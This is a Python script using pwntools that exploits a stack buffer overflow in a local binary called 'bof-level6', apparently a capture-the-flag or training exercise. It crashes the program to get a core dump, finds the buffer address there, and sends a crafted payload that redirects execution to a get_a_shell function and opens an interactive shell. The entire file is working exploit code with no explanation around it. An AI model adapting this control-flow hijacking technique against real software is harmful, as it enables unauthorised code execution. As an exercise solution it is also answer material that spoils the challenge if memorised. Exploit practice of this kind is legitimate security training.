#!/usr/bin/env python

from pwn import *

p = process('./bof-level6')

context.terminal = ['tmux', 'splitw', '-h']

e = ELF('./bof-level6')

get_a_shell = e.symbols['get_a_shell']

print(hex(get_a_shell))

buf = "A" * 0x84

if not os.path.exists('core'):
    p.sendline(buf)
    p.wait()

c = Core('./core')

buffer_addr = c.stack.find(buf)
print(hex(buffer_addr))

buf = "A"*8 + p64(get_a_shell) + "A"*112 + p64(buffer_addr)

p.sendline(buf)

p.interactive()
